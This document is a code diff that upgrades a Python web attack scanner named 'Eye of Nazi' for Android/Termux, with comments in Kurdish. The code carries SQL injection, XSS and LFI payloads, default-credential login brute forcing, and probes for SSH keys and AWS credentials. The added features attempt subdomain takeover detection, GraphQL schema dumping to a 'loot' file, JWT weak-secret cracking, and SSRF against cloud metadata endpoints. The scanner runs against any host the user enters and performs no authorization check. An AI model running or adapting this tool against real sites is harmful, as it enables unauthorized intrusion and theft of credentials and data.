@@ -1,9 +1,9 @@
 # language: Python, file: eye_of_nazi.py, target: Android/Termux
 # ═══════════════════════════════════════════════════════════════════
-#                    E Y E   O F   N A Z I   v2.0
-#           20 Advanced Features · HTML Report · Termux Ready
+#                    E Y E   O F   N A Z I   v3.0
+#         25 Features · 5 Critical Exploits · HTML Report
 # ═══════════════════════════════════════════════════════════════════
-# پێویست: pkg install python && pip install requests beautifulsoup4 dnspython
+# پێویست: pkg install python whois && pip install requests beautifulsoup4 dnspython
 
 import os, sys, re, json, time, socket, ssl, ftplib, hashlib, hmac
 import urllib.request, urllib.parse, subprocess, random, threading
@@ -20,7 +20,7 @@ except ImportError:
     sys.exit(1)
 
 # ─── CONFIG ───────────────────────────────────────────────────────
-VERSION = "2.0"
+VERSION = "3.0"
 LOGFILE = "eye_of_nazi_log.txt"
 REPORT_FILE = "eye_of_nazi_report.html"
 THREADS = 200
@@ -65,46 +65,17 @@ class Logger:
 
 LOG = Logger(LOGFILE)
 
-# ─── LOGO (لەناو کۆدەکەدا) ────────────────────────────────────────
+# ─── LOGO (سادە، بێ تێکچوون) ───────────────────────────────────────
 LOGO = r"""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣤⣤⣤⣤⣤⣤⣤⣤⣤⠄
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣴⡴
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢿⡖
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⢹⡿⢿⣿⣿⣿⣿⣿⣷⡦
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⠷⠀⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⢸⣿⡿⠿⠀⠈⠀⠀⠁⠖⡿⣿⣿⣿⣇⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡟⠿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣏⣤
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣦⣿⣛⡀⠀⠀⢻⣷⡆⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡟⠛
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠠⣶⣶⣿⡿⠆⠀⠀⠀⢨⣿⣷⣇⠀⢀⠀⠀⠀⠀⠀⣿⣿⣿⡯⠅
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣇⣀⣐⣤⣾⣿⣿⣿⣿⣿⢀⠀⠀⣀⠀⠀⢸⣿⣿⣿⣿⣾⣿⣣⣀⣀⣿⣿⣿⣷⡖
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣤⣤⣿⣤⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
-⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣟⠭⠽⠋⠉⠩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⠉⠉⡍⠭⠹⣿⣿⡏⡅
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⣀⣀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠀⣀⣀⣀⣿⣿⣿⡇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠆⠀⠀⣿⣿⣿⣿⣿⡿⠇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣇⡄⢀⣿⣿⣿⣿⣿⣿⣿⡟⣻⡟⢻⣿⣿⣿⣿⣿⣭⣄⣤⣿⣿⣿⣿⣿⡃
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠨⣿⣿⣿⣿⠍⠉⠙⠉⠉⠉⠉⠉⢹⣿⣿⣿⠩⠅⣺⣿⣿⣿⣿⡇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢸⣿⢿⡇⣽⣿⣿⣿⡿⣿
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡆⠀⠻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠃⠀⣿⣿⣿⠶⠛
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⣣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣿⣿⣿⡎⠁
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣿⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣿⣿⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢼⣿⣿⣿⣿⣒⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣲⣿⣿⣿⣿⣿⠶
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡟
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣤⡄⠰⡤⣤⣤⡀⡄⠀⢰⣼⣿⣿⣿⣿⢿⡝
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠋
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠇
+  ███████╗██╗   ██╗███████╗
+  ██╔════╝╚██╗ ██╔╝██╔════╝
+  █████╗   ╚████╔╝ █████╗  
+  ██╔══╝    ╚██╔╝  ██╔══╝  
+  ███████╗   ██║   ███████╗
+  ╚══════╝   ╚═╝   ╚══════╝
+       O F   N A Z I
+       v3.0 · 25 Features
 """
-
-def load_logo():
-    return LOGO
 
 # ─── HELPERS ──────────────────────────────────────────────────────
 def safe_get(url, **kw):
@@ -133,8 +104,10 @@ def norm_target(target):
     return base, host
 
 def path_to_safe(url):
-    return re.sub(r"[^a-zA-Z0-9._-]", "_", url.split("//")[-1])[:80]# ═══════════════════════════════════════════════════════════════════
-# FEATURE 1 — SUBDOMAIN ENUM (crt.sh + DNS bruteforce)
+    return re.sub(r"[^a-zA-Z0-9._-]", "_", url.split("//")[-1])[:80]
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 1 — SUBDOMAIN ENUM
 # ═══════════════════════════════════════════════════════════════════
 def feat_subdomains(host):
     LOG.log(f"[1] Subdomain Enum: {host}", "INFO")
@@ -195,13 +168,11 @@ def feat_banner(host, port):
         s.close()
         if data:
             LOG.log(f"    [{port}] {data[:120]}", "OK")
-            return data
     except Exception:
         pass
-    return None
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 4 — HTTP HEADERS + SECURITY HEADERS
+# FEATURE 4 — HTTP HEADERS
 # ═══════════════════════════════════════════════════════════════════
 def feat_headers(base_url):
     LOG.log(f"[4] HTTP Headers: {base_url}", "INFO")
@@ -221,10 +192,9 @@ def feat_headers(base_url):
         else:
             add_finding("LOW", f"Header کەم: {h}", name)
     LOG.log(f"    Server: {r.headers.get('Server','?')}", "OK")
-    LOG.log(f"    X-Powered-By: {r.headers.get('X-Powered-By','?')}", "OK")
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 5 — SSL/TLS ANALYSIS
+# FEATURE 5 — SSL/TLS
 # ═══════════════════════════════════════════════════════════════════
 def feat_ssl(host):
     LOG.log(f"[5] SSL/TLS: {host}", "INFO")
@@ -233,19 +203,17 @@ def feat_ssl(host):
         with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
             s.settimeout(5); s.connect((host, 443))
             cert = s.getpeercert()
-            LOG.log(f"    Subject: {dict(x[0] for x in cert.get('subject',[]))}", "OK")
-            LOG.log(f"    Issuer: {dict(x[0] for x in cert.get('issuer',[]))}", "OK")
             LOG.log(f"    Expires: {cert.get('notAfter')}", "OK")
             LOG.log(f"    TLS: {s.version()}", "OK")
     except Exception as e:
         LOG.log(f"    نەکرا: {e}", "WARN")
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 6 — DNS RECON
+# FEATURE 6 — DNS
 # ═══════════════════════════════════════════════════════════════════
 def feat_dns(host):
     LOG.log(f"[6] DNS: {host}", "INFO")
-    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
+    for rtype in ["A","AAAA","MX","NS","TXT","CNAME"]:
         try:
             ans = dns.resolver.resolve(host, rtype, lifetime=5)
             for a in ans:
@@ -279,7 +247,7 @@ SENSITIVE_FILES = [
     "/.htaccess","/.htpasswd","/web.config","/composer.json","/package.json",
     "/.aws/credentials","/.ssh/id_rsa","/id_rsa","/.DS_Store",
     "/swagger.json","/openapi.json","/api-docs","/graphql",
-    "/server-status","/.well-known/security.txt","/crossdomain.xml",
+    "/server-status","/.well-known/security.txt",
     "/readme.html","/readme.md","/CHANGELOG.md","/LICENSE","/robots.txt",
 ]
 
@@ -328,7 +296,7 @@ def feat_dirs(base_url):
         try:
             r = requests.get(url, timeout=4, allow_redirects=False, headers=ua())
             if r.status_code in (200,301,302,401,403):
-                return (url, r.status_code, len(r.content))
+                return (url, r.status_code)
         except Exception:
             pass
         return None
@@ -367,7 +335,9 @@ def feat_login(base_url):
             if rr and rr.status_code == 200 and any(
                 k in rr.text.lower() for k in ["logout","dashboard","welcome","profile"]):
                 add_finding("CRITICAL", f"چوونەژوورەوە: {u}:{p}", url)
-                return# ═══════════════════════════════════════════════════════════════════
+                return
+
+# ═══════════════════════════════════════════════════════════════════
 # FEATURE 11 — SQL INJECTION
 # ═══════════════════════════════════════════════════════════════════
 SQLI_PAYLOADS = [
@@ -395,14 +365,13 @@ def feat_sqli(base_url):
                 add_finding("CRITICAL", f"SQLi (time): {p}", url)
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 12 — XSS SCAN
+# FEATURE 12 — XSS
 # ═══════════════════════════════════════════════════════════════════
 XSS_PAYLOADS = [
     "<script>alert(1)</script>",
     "\"><script>alert(1)</script>",
     "'><img src=x onerror=alert(1)>",
     "<svg/onload=alert(1)>",
-    "javascript:alert(1)",
 ]
 
 def feat_xss(base_url):
@@ -417,7 +386,7 @@ def feat_xss(base_url):
                 break
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 13 — LFI SCAN
+# FEATURE 13 — LFI
 # ═══════════════════════════════════════════════════════════════════
 LFI_PAYLOADS = [
     "../../../../etc/passwd",
@@ -453,7 +422,7 @@ def feat_open_redirect(base_url):
             add_finding("MEDIUM", f"Open Redirect: {p}", url)
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 15 — CORS MISCONFIG
+# FEATURE 15 — CORS
 # ═══════════════════════════════════════════════════════════════════
 def feat_cors(base_url):
     LOG.log(f"[15] CORS: {base_url}", "INFO")
@@ -465,7 +434,7 @@ def feat_cors(base_url):
         add_finding("HIGH", "CORS misconfig", f"ACAO={acao} ACAC={acac}")
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 16 — WAF DETECTION
+# FEATURE 16 — WAF
 # ═══════════════════════════════════════════════════════════════════
 WAFS = {
     "Cloudflare": ["cloudflare","cf-ray"],
@@ -473,7 +442,6 @@ WAFS = {
     "Sucuri": ["sucuri","x-sucuri"],
     "Akamai": ["akamai","x-akamai"],
     "Imperva": ["imperva","incap_ses"],
-    "F5 BIG-IP": ["bigip","x-wa-info"],
     "ModSecurity": ["mod_security","modsecurity"],
     "Wordfence": ["wordfence"],
 }
@@ -494,17 +462,16 @@ def feat_waf(base_url):
 TECH_SIGS = {
     "WordPress": ["wp-content","wp-includes","wordpress"],
     "Drupal": ["drupal","sites/default"],
-    "Joomla": ["joomla","com_content"],
+    "Joomla": ["joomla"],
     "Laravel": ["laravel","csrf-token"],
     "Django": ["django","csrfmiddlewaretoken"],
     "React": ["react","_react"],
-    "Vue": ["vue.js","__vue__"],
+    "Vue": ["vue.js"],
     "Angular": ["ng-","angular"],
     "jQuery": ["jquery"],
     "Bootstrap": ["bootstrap"],
     "Nginx": ["nginx"],
     "Apache": ["apache"],
-    "Cloudflare": ["cloudflare"],
     "PHP": ["php"],
     "ASP.NET": ["asp.net","__viewstate"],
 }
@@ -520,10 +487,10 @@ def feat_tech(base_url):
             LOG.log(f"    [+] {tech}", "OK")
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 18 — EMAIL + LINK + FORM EXTRACT
+# FEATURE 18 — EXTRACT (emails/links/forms)
 # ═══════════════════════════════════════════════════════════════════
 def feat_extract(base_url):
-    LOG.log(f"[18] Extract (emails/links/forms): {base_url}", "INFO")
+    LOG.log(f"[18] Extract: {base_url}", "INFO")
     r = safe_get(base_url)
     if not r: return
     emails = set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", r.text))
@@ -532,14 +499,9 @@ def feat_extract(base_url):
     soup = BeautifulSoup(r.text, "html.parser")
     for a in list(soup.find_all("a", href=True))[:20]:
         LOG.log(f"    link: {a['href'][:80]}", "INFO")
-    for i, form in enumerate(soup.find_all("form")):
-        action = form.get("action","")
-        method = form.get("method","GET").upper()
-        inputs = [inp.get("name") for inp in form.find_all(["input","textarea"]) if inp.get("name")]
-        LOG.log(f"    form{i}: {method} {action} — {inputs}", "OK")
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 19 — SECRETS SCAN
+# FEATURE 19 — SECRETS
 # ═══════════════════════════════════════════════════════════════════
 SECRET_PATTERNS = {
     "AWS Key": r"AKIA[0-9A-Z]{16}",
@@ -560,7 +522,7 @@ def feat_secrets(base_url):
             add_finding("HIGH", f"{name} لە HTML", str(m)[:60])
 
 # ═══════════════════════════════════════════════════════════════════
-# FEATURE 20 — JS ANALYSIS (endpoints + secrets)
+# FEATURE 20 — JS ANALYSIS
 # ═══════════════════════════════════════════════════════════════════
 def feat_js(base_url):
     LOG.log(f"[20] JS Analysis: {base_url}", "INFO")
@@ -577,8 +539,217 @@ def feat_js(base_url):
             for m in re.findall(pat, rr.text, re.IGNORECASE):
                 add_finding("HIGH", f"{name} لە JS: {js}", str(m)[:60])
         for m in set(re.findall(r'["\'](/api/[^"\']+)["\']', rr.text)):
-            LOG.log(f"    API لە JS: {m}", "OK")# ═══════════════════════════════════════════════════════════════════
-# HTML REPORT BUILDER
+            LOG.log(f"    API لە JS: {m}", "OK")
+
+# ═══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+#            5 تایبەتمەندی نوێی خەتەرناک (FEATURE 21-25)
+# ═══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 21 — SUBDOMAIN TAKEOVER (خەتەرناک)
+# ═══════════════════════════════════════════════════════════════════
+TAKEOVER_SIGS = {
+    "github.io": "There isn't a GitHub Pages site here",
+    "herokuapp.com": "No such app",
+    "s3.amazonaws.com": "NoSuchBucket",
+    "cloudfront.net": "Bad request",
+    "azurewebsites.net": "404 Web Site not found",
+    "wordpress.com": "Do you want to register",
+    "shopify.com": "Sorry, this shop is currently unavailable",
+    "fastly.net": "Fastly error: unknown domain",
+    "pantheonsite.io": "The gods are wise",
+    "bitbucket.io": "Repository not found",
+    "readthedocs.io": "unknown to Read the Docs",
+    "surge.sh": "project not found",
+    "netlify.app": "Not Found - Request ID",
+    "ghost.io": "Domain error",
+    "zendesk.com": "Help Center Closed",
+}
+
+def feat_subdomain_takeover(host):
+    """[21] Subdomain Takeover — دۆزینەوەی subdomainـی مردوو کە دەکرێت بگیرێت."""
+    LOG.log(f"[21] Subdomain Takeover: {host}", "INFO")
+    subs = set()
+    try:
+        r = requests.get(f"https://crt.sh/?q=%25.{host}&output=json", timeout=15)
+        for e in r.json():
+            for n in e.get("name_value","").split("\n"):
+                if n.endswith(host) and "*" not in n:
+                    subs.add(n.strip())
+    except Exception:
+        pass
+    if not subs:
+        LOG.log("    هیچ subdomain نەدۆزرایەوە", "WARN")
+        return
+    def check(sub):
+        try:
+            # CNAME check
+            try:
+                ans = dns.resolver.resolve(sub, "CNAME", lifetime=3)
+                cname = str(ans[0]).rstrip(".")
+            except Exception:
+                cname = ""
+            rr = requests.get(f"http://{sub}", timeout=5, allow_redirects=True)
+            for sig_domain, sig_text in TAKEOVER_SIGS.items():
+                if sig_domain in cname or sig_text.lower() in rr.text.lower():
+                    return (sub, cname or sig_domain, sig_text)
+        except Exception:
+            pass
+        return None
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+        for res in ex.map(check, list(subs)[:60]):
+            if res:
+                sub, cname, sig = res
+                add_finding("CRITICAL", f"Subdomain Takeover: {sub}",
+                            f"CNAME → {cname} · signature: {sig}")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 22 — CVE VERSION SCAN (خەتەرناک)
+# ═══════════════════════════════════════════════════════════════════
+KNOWN_VULNS = {
+    "apache/2.4.49": ("CVE-2021-41773", "CRITICAL", "Path traversal + RCE"),
+    "apache/2.4.50": ("CVE-2021-42013", "CRITICAL", "Path traversal + RCE"),
+    "nginx/1.20.0":  ("CVE-2021-23017", "HIGH", "DNS resolver off-by-one"),
+    "openssh/7.4":   ("CVE-2018-15473", "MEDIUM", "Username enumeration"),
+    "php/7.4":       ("CVE-2021-21707", "MEDIUM", "Special character bypass"),
+    "wordpress/5.":  ("CVE-2022-21661", "HIGH", "SQLi via WP_Query"),
+    "drupal/7.":     ("CVE-2018-7600", "CRITICAL", "Drupalgeddon2 RCE"),
+    "joomla/3.":     ("CVE-2015-8562", "CRITICAL", "RCE via HTTP headers"),
+    "struts/2.":     ("CVE-2017-5638", "CRITICAL", "Jakarta RCE"),
+    "log4j":         ("CVE-2021-44228", "CRITICAL", "Log4Shell RCE"),
+    "exchange":      ("CVE-2021-26855", "CRITICAL", "ProxyLogon SSRF"),
+    "confluence":    ("CVE-2022-26134", "CRITICAL", "OGNL Injection RCE"),
+    "gitlab":        ("CVE-2021-22205", "CRITICAL", "ExifTool RCE"),
+    "spring":        ("CVE-2022-22965", "CRITICAL", "Spring4Shell RCE"),
+}
+
+def feat_cve(base_url):
+    """[22] CVE Version Scan — بەراوردکردنی وەشان لەگەڵ CVE ناسراوەکان."""
+    LOG.log(f"[22] CVE Version Scan: {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    server = r.headers.get("Server","").lower()
+    powered = r.headers.get("X-Powered-By","").lower()
+    combined = f"{server} {powered}".lower()
+    LOG.log(f"    Server: {server} · X-Powered-By: {powered}", "OK")
+    for sig, (cve, sev, desc) in KNOWN_VULNS.items():
+        if sig in combined:
+            add_finding(sev, f"{cve} — {sig}", desc)
+    # WordPress version
+    wp = re.search(r"wp-(?:includes|content)/.*?ver=([\d.]+)", r.text)
+    if wp:
+        LOG.log(f"    WordPress ver: {wp.group(1)}", "OK")
+        add_finding("INFO", f"WordPress version: {wp.group(1)}", "پشکنینی CVE بکە")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 23 — GRAPHQL INTROSPECTION (خەتەرناک)
+# ═══════════════════════════════════════════════════════════════════
+def feat_graphql(base_url):
+    """[23] GraphQL Introspection — دەرهێنانی schema تەواو."""
+    LOG.log(f"[23] GraphQL Introspection: {base_url}", "INFO")
+    endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]
+    query = {"query": "{__schema{types{name kind fields{name type{name}}}}}"}
+    for ep in endpoints:
+        url = base_url.rstrip("/") + ep
+        try:
+            r = requests.post(url, json=query, timeout=TIMEOUT,
+                              headers={"Content-Type": "application/json"})
+            if r.status_code == 200 and "__schema" in r.text:
+                add_finding("HIGH", f"GraphQL Introspection چالاک: {url}",
+                            "هەموو schema دەردەکەوێت")
+                try:
+                    data = r.json()
+                    types = data.get("data",{}).get("__schema",{}).get("types",[])
+                    for t in types[:30]:
+                        name = t.get("name","")
+                        if not name.startswith("__"):
+                            LOG.log(f"    type: {name}", "OK")
+                            # پاشەکەوتکردنی schema
+                            with open("loot_graphql_schema.json", "a", encoding="utf-8") as f:
+                                f.write(json.dumps(t, ensure_ascii=False) + "\n")
+                except Exception:
+                    pass
+                return
+        except Exception:
+            pass
+    LOG.log("    GraphQL نەدۆزرایەوە", "INFO")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 24 — JWT WEAK SECRET (خەتەرناک)
+# ═══════════════════════════════════════════════════════════════════
+JWT_SECRETS = [
+    "secret","password","123456","admin","jwt","key","changeme","default",
+    "supersecret","mysecret","test","root","qwerty","letmein","token",
+    "secretkey","jwtsecret","mykey","app","api","auth","private","public",
+]
+
+def feat_jwt(base_url):
+    """[24] JWT Weak Secret — هەوڵدان بە weak secret."""
+    LOG.log(f"[24] JWT Analysis: {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    tokens = re.findall(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", r.text)
+    for c in r.cookies:
+        if c.value.count(".") == 2 and c.value.startswith("eyJ"):
+            tokens.append(c.value)
+    if not tokens:
+        LOG.log("    JWT نەدۆزرایەوە", "INFO")
+        return
+    for token in set(tokens[:5]):
+        parts = token.split(".")
+        try:
+            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
+            LOG.log(f"    JWT header: {header}", "OK")
+            LOG.log(f"    JWT payload: {payload}", "OK")
+            add_finding("MEDIUM", "JWT token دۆزرایەوە",
+                        f"alg={header.get('alg')} payload={payload}")
+            # weak secret test
+            if header.get("alg") == "HS256":
+                for secret in JWT_SECRETS:
+                    sig = hmac.new(secret.encode(), f"{parts[0]}.{parts[1]}".encode(),
+                                   hashlib.sha256).digest()
+                    expected = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+                    if expected == parts[2]:
+                        add_finding("CRITICAL", "JWT Weak Secret!",
+                                    f"secret = '{secret}' → token دەکرێت بگۆڕدرێت")
+                        return
+        except Exception:
+            pass
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 25 — SSRF DETECTION (خەتەرناک)
+# ═══════════════════════════════════════════════════════════════════
+SSRF_TARGETS = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://127.0.0.1:80/",
+    "http://localhost:22/",
+    "http://[::1]/",
+    "file:///etc/passwd",
+    "http://metadata.google.internal/computeMetadata/v1/",
+]
+
+def feat_ssrf(base_url):
+    """[25] SSRF Detection — دۆزینەوەی پارامەتری URL کە دەکرێت سوءاستفاده بکرێت."""
+    LOG.log(f"[25] SSRF Scan: {base_url}", "INFO")
+    params = ["url","path","redirect","next","target","dest","uri","link",
+              "image","file","load","fetch","proxy","callback","return"]
+    for param in params:
+        for target in SSRF_TARGETS:
+            url = f"{base_url}?{param}={urllib.parse.quote(target)}"
+            try:
+                r = requests.get(url, timeout=8, headers=ua())
+                if ("root:x:" in r.text or "ami-id" in r.text or
+                    "redis_version" in r.text or "computeMetadata" in r.text):
+                    add_finding("CRITICAL", f"SSRF: {param} → {target}", url)
+                    return
+            except Exception:
+                pass
+
+# ═══════════════════════════════════════════════════════════════════
+# HTML REPORT
 # ═══════════════════════════════════════════════════════════════════
 def build_report(target, duration):
     counts = defaultdict(int)
@@ -616,7 +787,6 @@ th,td{{padding:10px;border:1px solid #333;text-align:left;vertical-align:top}}
 th{{background:#1a1a1a;color:#e67e22}}
 tr:hover{{background:#151515}}
 .meta{{text-align:center;color:#666;font-size:12px;margin-top:30px}}
-pre{{background:#111;padding:10px;border-radius:5px;overflow:auto;font-size:11px;color:#0f0}}
 </style>
 </head>
 <body>
@@ -653,10 +823,10 @@ pre{{background:#111;padding:10px;border-radius:5px;overflow:auto;font-size:11px
 # ═══════════════════════════════════════════════════════════════════
 def main():
     os.system("clear" if os.name == "posix" else "cls")
-    print(LOGO)
-    print(f"\n{C.R}{'═'*60}{C.RESET}")
+    print(f"{C.R}{LOGO}{C.RESET}")
+    print(f"{C.R}{'═'*60}{C.RESET}")
     print(f"{C.BOLD}         E Y E   O F   N A Z I   v{VERSION}{C.RESET}")
-    print(f"{C.M}       Web Scanner · 20 Features · HTML Report{C.RESET}")
+    print(f"{C.M}     25 Features · 5 Critical Exploits{C.RESET}")
     print(f"{C.R}{'═'*60}{C.RESET}\n")
 
     target = input(f"{C.Y}ناوی وێبسایت یان IP: {C.RESET}").strip()
@@ -668,53 +838,82 @@ def main():
     LOG.log(f"ئامانج: {base_url} · host: {host}", "INFO")
     start = time.time()
 
-    # ─── جێبەجێکردنی هەموو تایبەتمەندییەکان ───
+    # ─── DNS & NETWORK ───
     print(f"\n{C.B}━━━ DNS & NETWORK ━━━{C.RESET}")
-    try: feat_dns(host)
-    except Exception as e: LOG.log(f"DNS: {e}", "ERR")
-    try: feat_whois(host)
-    except Exception as e: LOG.log(f"WHOIS: {e}", "ERR")
-    try: feat_ssl(host)
-    except Exception as e: LOG.log(f"SSL: {e}", "ERR")
+    for fn, args in [(feat_dns,(host,)), (feat_whois,(host,)), (feat_ssl,(host,))]:
+        try: fn(*args)
+        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
 
+    # ─── SUBDOMAIN ───
     print(f"\n{C.B}━━━ SUBDOMAIN ENUM ━━━{C.RESET}")
     try: feat_subdomains(host)
     except Exception as e: LOG.log(f"Subdomains: {e}", "ERR")
 
+    # ─── PORT SCAN ───
     print(f"\n{C.B}━━━ PORT SCAN ━━━{C.RESET}")
+    open_ports = []
     try:
         open_ports = feat_ports(host)
         for p in open_ports[:10]:
             feat_banner(host, p)
     except Exception as e:
         LOG.log(f"Ports: {e}", "ERR")
-        open_ports = []
 
+    # ─── HTTP ───
     print(f"\n{C.B}━━━ HTTP ANALYSIS ━━━{C.RESET}")
     for fn in [feat_headers, feat_tech, feat_waf, feat_cors]:
         try: fn(base_url)
